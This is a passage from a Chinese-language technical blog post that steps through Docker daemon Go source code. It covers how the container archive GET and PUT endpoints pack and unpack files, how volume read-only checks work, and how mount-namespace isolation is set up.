daemon.GetContainer(name)<br>...<br>content, stat, err = daemon.containerArchivePath(ctr, path)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>当docker daemon检测到”GET &#x2F;containers&#x2F;(containerID)&#x2F;archive”接口有消息时会进入到getContainersArchive函数。getContainersArchive函数会经过s.backend.ContainerArchivePath函数调用到daemon.containerArchivePath函数。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> containerArchivePath(container *container.Container, path <span class="hljs-type">string</span>) (content io.ReadCloser, stat *types.ContainerPathStat, err <span class="hljs-type">error</span>) &#123;<br>cfs, err := daemon.openContainerFS(container)<br>absPath := archive.PreserveTrailingDotOrSeparator(filepath.Join(<span class="hljs-string">&quot;/&quot;</span>, path), path)<br><br>stat, err = cfs.Stat(context.TODO(), absPath)<br>...<br>sourceDir, sourceBase := absPath, <span class="hljs-string">&quot;.&quot;</span><br><span class="hljs-keyword">if</span> stat.Mode&amp;os.ModeDir == <span class="hljs-number">0</span> &#123; <span class="hljs-comment">// not dir</span><br>sourceDir, sourceBase = filepath.Split(absPath)<br>&#125;<br>opts := archive.TarResourceRebaseOpts(sourceBase, filepath.Base(absPath))<br><br>tb, err := archive.NewTarballer(sourceDir, opts)<br>...<br>cfs.GoInFS(context.TODO(), tb.Do)<br>data := tb.Reader()<br>content = ioutils.NewReadCloserWrapper(data, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br>err := data.Close()<br>_ = cfs.Close()<br>container.Unlock()<br><span class="hljs-keyword">return</span> err<br>&#125;)<br>...<br><span class="hljs-keyword">return</span> content, stat, <span class="hljs-literal">nil</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>该函数首先通过容器信息打开一个容器的文件系统，使用Stat函数获取要打包的文件信息。如果该文件不是路径类文件，则sourceDir，sourceBase分别为该文件的路径和文件名，否则sourceDir和sourceBase分别为该文件的路径和“.“。例如：要打包的文件为&#x2F;etc&#x2F;passwd，那么sourceDir为&#x2F;etc&#x2F;,sourceBase为passwd；要打包的文件为&#x2F;etc&#x2F;，那么sourceDir为&#x2F;etc&#x2F;，sourceBase为“.”</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs golang">cfs, err := daemon.openContainerFS(container)<br>absPath := archive.PreserveTrailingDotOrSeparator(filepath.Join(<span class="hljs-string">&quot;/&quot;</span>, path), path)<br><br>stat, err = cfs.Stat(context.TODO(), absPath)<br>...<br>sourceDir, sourceBase := absPath, <span class="hljs-string">&quot;.&quot;</span><br><span class="hljs-keyword">if</span> stat.Mode&amp;os.ModeDir == <span class="hljs-number">0</span> &#123; <span class="hljs-comment">// not dir</span><br>sourceDir, sourceBase = filepath.Split(absPath)<br>&#125;<br></code></pre></td></tr></table></figure><p>之后根据sourceDir和opts（由sourceBase生成的用来指示打包信息的选项）生成一个新的Tarballer对象。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs golang">opts := archive.TarResourceRebaseOpts(sourceBase, filepath.Base(absPath))<br>tb, err := archive.NewTarballer(sourceDir, opts)<br></code></pre></td></tr></table></figure><p>下面就要进行文件打包的操作了，首先会使用GoInFS将该操作限定在容器的上下文环境中，在容器的上下文环境中使用tb.Do进行具体的打包逻辑,最后将打包好的文件返回。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs golang">cfs.GoInFS(context.TODO(), tb.Do)<br>data := tb.Reader()<br>content = ioutils.NewReadCloserWrapper(data, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br>err := data.Close()<br>_ = cfs.Close()<br>container.Unlock()<br><span class="hljs-keyword">return</span> err<br>&#125;)<br>...<br><span class="hljs-keyword">return</span> content, stat, <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><h3 id="putContainersArchive"><a href="#putContainersArchive" class="headerlink" title="putContainersArchive"></a>putContainersArchive</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *containerRouter)</span></span> putContainersArchive(ctx context.Context, w http.ResponseWriter, r *http.Request, vars <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>v, err := httputils.ArchiveFormValues(r, vars)<br>...<br><span class="hljs-keyword">return</span> s.backend.ContainerExtractToDir(v.Name, v.Path, copyUIDGID, noOverwriteDirNonDir, r.Body)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> ContainerExtractToDir(name, path <span class="hljs-type">string</span>, copyUIDGID, noOverwriteDirNonDir <span class="hljs-type">bool</span>, content io.Reader) <span class="hljs-type">error</span> &#123;<br>ctr, err := daemon.GetContainer(name)<br>...<br>err = daemon.containerExtractToDir(ctr, path, copyUIDGID, noOverwriteDirNonDir, content)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>当docker daemon监听到<code>PUT /containers/(containerID)/archive</code>接口有请求时会进入putContainersArchive函数。该函数会通过s.backend.ContainerExtractToDir函数调用到daemon.containerExtractToDir函数。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> containerExtractToDir(container *container.Container, path <span class="hljs-type">string</span>, copyUIDGID, noOverwriteDirNonDir <span class="hljs-type">bool</span>, content io.Reader) (err <span class="hljs-type">error</span>) &#123;<br>...<br>cfs, err := daemon.openContainerFS(container)<br>...<br>err = cfs.RunInFS(context.TODO(), <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br>...<br>absPath, err := filepath.EvalSymlinks(filepath.Join(<span class="hljs-string">&quot;/&quot;</span>, path))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>absPath = archive.PreserveTrailingDotOrSeparator(absPath, path)<br><br>stat, err := os.Lstat(absPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">if</span> !stat.IsDir() &#123;<br><span class="hljs-keyword">return</span> errdefs.InvalidParameter(errors.New(<span class="hljs-string">&quot;extraction point is not a directory&quot;</span>))<br>&#125;<br><br><span class="hljs-comment">// Need to check if the path is in a volume. If it is, it cannot be in a</span><br><span class="hljs-comment">// read-only volume. If it is not in a volume, the container cannot be</span><br><span class="hljs-comment">// configured with a read-only rootfs.</span><br>toVolume, err := checkIfPathIsInAVolume(container, absPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">if</span> !toVolume &amp;&amp; container.HostConfig.ReadonlyRootfs &#123;<br><span class="hljs-keyword">return</span> errdefs.InvalidParameter(errors.New(<span class="hljs-string">&quot;container rootfs is marked read-only&quot;</span>))<br>&#125;<br><br>options := daemon.defaultTarCopyOptions(noOverwriteDirNonDir)<br><br><span class="hljs-keyword">if</span> copyUIDGID &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br><span class="hljs-comment">// tarCopyOptions will appropriately pull in the right uid/gid for the</span><br><span class="hljs-comment">// user/group and will set the options.</span><br>options, err = daemon.tarCopyOptions(container, noOverwriteDirNonDir)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> archive.Untar(content, absPath, options)<br>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>daemon.LogContainerEvent(container, <span class="hljs-string">&quot;extract-to-dir&quot;</span>)<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该函数首先通过容器信息打开对应容器的文件系统，之后使用RunInFS将文件解包的操作限制在容器的上下文环境之中。在文件解包时，docker daemon首先通过filepath.EvalSymlinks函数解析目标目录的绝对路径，在此过程中所有符号连接都会被解析。完成解析后，会使用os.Lstat函数获取文件的状态信息。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs golang">absPath, err := filepath.EvalSymlinks(filepath.Join(<span class="hljs-string">&quot;/&quot;</span>, path))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>absPath = archive.PreserveTrailingDotOrSeparator(absPath, path)<br><br>stat, err := os.Lstat(absPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">if</span> !stat.IsDir() &#123;<br><span class="hljs-keyword">return</span> errdefs.InvalidParameter(errors.New(<span class="hljs-string">&quot;extraction point is not a directory&quot;</span>))<br>&#125;<br></code></pre></td></tr></table></figure><p>之后会判断该目标路径是否位于一个只读卷或者只读的rootfs中，如果返回true则会报错。<br>此部分的具体处理逻辑为：<br>调用checkIfPathIsInAVolume函数判断目标路径是否在挂载卷中，如果是则把toVolume置为true并判断该卷是否为一个只读卷，如果是一个只读卷则返回false和一个err。<br>调用完该函数后对该函数的返回值做一个判断，如果err不为空则代表该目标路径位于一个只读卷中，则直接返回该err。否则使用toVolume判断目标路径是否在一个挂载卷中（此时如果toVolume为true那么该卷一定为可读写的。）如果目标路径不在挂载卷中并且此时的rootfs也是只读的，那么就返回一个错误</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs golang">toVolume, err := checkIfPathIsInAVolume(container, absPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">if</span> !toVolume &amp;&amp; container.HostConfig.ReadonlyRootfs &#123;<br><span class="hljs-keyword">return</span> errdefs.InvalidParameter(errors.New(<span class="hljs-string">&quot;container rootfs is marked read-only&quot;</span>))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkIfPathIsInAVolume</span><span class="hljs-params">(container *container.Container, absPath <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">bool</span>, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> toVolume <span class="hljs-type">bool</span><br>parser := volumemounts.NewParser()<br><span class="hljs-keyword">for</span> _, mnt := <span class="hljs-keyword">range</span> container.MountPoints &#123;<br><span class="hljs-keyword">if</span> toVolume = parser.HasResource(mnt, absPath); toVolume &#123;<br><span class="hljs-keyword">if</span> mnt.RW &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, errdefs.InvalidParameter(errors.New(<span class="hljs-string">&quot;mounted volume is marked read-only&quot;</span>))<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> toVolume, <span class="hljs-literal">nil</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>解包的下一步操作是根据是否需要复制文件的UID和GID设置不同的options，并将options作为参数与打包文件的信息content和目标文件路径absPath共同传入archive.Untar函数执行具体的解包逻辑。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs golang">options := daemon.defaultTarCopyOptions(noOverwriteDirNonDir)<br><br><span class="hljs-keyword">if</span> copyUIDGID &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br><span class="hljs-comment">// tarCopyOptions will appropriately pull in the right uid/gid for the</span><br><span class="hljs-comment">// user/group and will set the options.</span><br>options, err = daemon.tarCopyOptions(container, noOverwriteDirNonDir)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> archive.Untar(content, absPath, options)<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> tarCopyOptions(container *container.Container, noOverwriteDirNonDir <span class="hljs-type">bool</span>) (*archive.TarOptions, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> container.Config.User == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> daemon.defaultTarCopyOptions(noOverwriteDirNonDir), <span class="hljs-literal">nil</span><br>&#125;<br><br>user, err := idtools.LookupUser(container.Config.User)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br>identity := idtools.Identity&#123;UID: user.Uid, GID: user.Gid&#125;<br><br><span class="hljs-keyword">return</span> &amp;archive.TarOptions&#123;<br>NoOverwriteDirNonDir: noOverwriteDirNonDir,<br>ChownOpts:            &amp;identity,<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果copyUIDGID为false，那么options则为默认的配置。否则options由tarCopyOptions函数生成，该函数生成的options中会附带UID GID的信息。</p><h3 id="GoInFS-RunInFS"><a href="#GoInFS-RunInFS" class="headerlink" title="GoInFS&amp;&amp;RunInFS"></a>GoInFS&amp;&amp;RunInFS</h3><p>在上面的描述中我们会发现docker daemon使用了GoInFS和RunInFS函数将操作限制在了容器的上下文里，那么这是如何实现的呢？以GoInFS函数为例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(vw *containerFSView)</span></span> GoInFS(ctx context.Context, fn <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> vw.todo &lt;- future&#123;fn: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123; fn(); <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span> &#125;&#125;:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br><span class="hljs-keyword">return</span> ctx.Err()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现该函数实际上是将参数中的fn函数构建了一个future的结构体传入了容器文件系统的todo的channel中，那么todo是什么时候被调用的呢？在调用GoInFS之前，我们需要先使用openContainerFS函数获取一个容器的文件系统对象。这个函数的内部具体实现如下：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> openContainerFS(container *container.Container) (_ *containerFSView, err <span class="hljs-type">error</span>) &#123;<br>...<br>todo := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> future)<br>...<br>err = unshare.Go(unix.CLONE_NEWNS,<br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> err := mount.MakeRSlave(<span class="hljs-string">&quot;/&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> mounts &#123;<br>dest, err := container.GetResourcePath(m.Destination)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">var</span> stat os.FileInfo<br>stat, err = os.Stat(m.Source)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">if</span> err := fileutils.CreateIfNotExists(dest, stat.IsDir()); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>bindMode := <span class="hljs-string">&quot;rbind&quot;</span><br><span class="hljs-keyword">if</span> m.NonRecursive &#123;<br>bindMode = <span class="hljs-string">&quot;bind&quot;</span><br>&#125;<br>writeMode := <span class="hljs-string">&quot;ro&quot;</span><br><span class="hljs-keyword">if</span> m.Writable &#123;<br>writeMode = <span class="hljs-string">&quot;rw&quot;</span><br><span class="hljs-keyword">if</span> m.ReadOnlyNonRecursive &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;options conflict: Writable &amp;&amp; ReadOnlyNonRecursive&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> m.ReadOnlyForceRecursive &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;options conflict: Writable &amp;&amp; ReadOnlyForceRecursive&quot;</span>)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> m.ReadOnlyNonRecursive &amp;&amp; m.ReadOnlyForceRecursive &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;options conflict: ReadOnlyNonRecursive &amp;&amp; ReadOnlyForceRecursive&quot;</span>)<br>&#125;<br><br>opts := strings.Join([]<span class="hljs-type">string</span>&#123;bindMode, writeMode, <span class="hljs-string">&quot;rprivate&quot;</span>&#125;, <span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-keyword">if</span> err := mount.Mount(m.Source, dest, <span class="hljs-string">&quot;&quot;</span>, opts); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">if</span> !m.Writable &amp;&amp; !m.ReadOnlyNonRecursive &#123;<br><span class="hljs-keyword">if</span> err := makeMountRRO(dest); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> m.ReadOnlyForceRecursive &#123;<br><span class="hljs-keyword">return</span> err<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>log.G(context.TODO()).WithError(err).Debugf(<span class="hljs-string">&quot;Failed to make %q recursively read-only&quot;</span>, dest)<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> mounttree.SwitchRoot(container.BaseFS)<br>&#125;,<br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(done)<br><br><span class="hljs-keyword">for</span> it := <span class="hljs-keyword">range</span> todo &#123;<br>err := it.fn()<br><span class="hljs-keyword">if</span> it.res != <span class="hljs-literal">nil</span> &#123;<br>it.res &lt;- err<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// The thread will terminate when this goroutine returns, taking the</span><br><span class="hljs-comment">// mount namespace and all the volume bind-mounts with it.</span><br>&#125;,<br>)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数向unshare.Go函数传递一个unix.CLONE_NEWNS参数和两个函数类型的参数，我们先看第一个函数类型的参数</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> err := mount.MakeRSlave(<span class="hljs-string">&quot;/&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> mounts &#123;<br>dest, err := container.GetResourcePath(m.Destination)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">var</span> stat os.FileInfo<br>stat, err = os.Stat(m.Source)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">if</span> err := fileutils.CreateIfNotExists(dest, stat.IsDir()); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br>bindMode := <span class="hljs-string">&quot;rbind&quot;</span><br><span class="hljs-keyword">if</span> m.NonRecursive &#123;<br>bindMode = <span class="hljs-string">&quot;bind&quot;</span><br>&#125;<br>writeMode := <span class="hljs-string">&quot;ro&quot;</span><br><span class="hljs-keyword">if</span> m.Writable &#123;<br>writeMode = <span class="hljs-string">&quot;rw&quot;</span><br><span class="hljs-keyword">if</span> m.ReadOnlyNonRecursive &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;options conflict: Writable &amp;&amp; ReadOnlyNonRecursive&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> m.ReadOnlyForceRecursive &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;options conflict: Writable &amp;&amp; ReadOnlyForceRecursive&quot;</span>)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> m.ReadOnlyNonRecursive &amp;&amp; m.ReadOnlyForceRecursive &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;options conflict: ReadOnlyNonRecursive &amp;&amp; ReadOnlyForceRecursive&quot;</span>)<br>&#125;<br><br><br>opts := strings.Join([]<span class="hljs-type">string</span>&#123;bindMode, writeMode, <span class="hljs-string">&quot;rprivate&quot;</span>&#125;, <span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-keyword">if</span> err := mount.Mount(m.Source, dest, <span class="hljs-string">&quot;&quot;</span>, opts); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">if</span> !m.Writable &amp;&amp; !m.ReadOnlyNonRecursive &#123;<br><span class="hljs-keyword">if</span> err := makeMountRRO(dest); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> m.ReadOnlyForceRecursive &#123;<br><span class="hljs-keyword">return</span> err<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>log.G(context.TODO()).WithError(err).Debugf(<span class="hljs-string">&quot;Failed to make %q recursively read-only&quot;</span>, 